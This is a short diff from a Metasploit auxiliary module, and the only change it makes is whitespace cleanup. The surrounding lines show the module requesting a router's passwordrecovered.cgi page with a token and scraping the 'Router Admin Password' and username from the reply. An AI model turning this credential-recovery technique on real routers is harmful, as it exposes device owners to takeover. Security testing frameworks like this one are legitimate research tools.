@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
         })
 
       vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
-      
+
       html = r.get_html_document
       raw_html = html.text
 
@@ -91,7 +91,7 @@ class MetasploitModule < Msf::Auxiliary
       password = scrape(raw_html, "Router Admin Password", "You can")
       username = username.strip!
       password = password.strip!
- 
+
         if username == "" || password == ""
           print_error("No Creds found")
         else
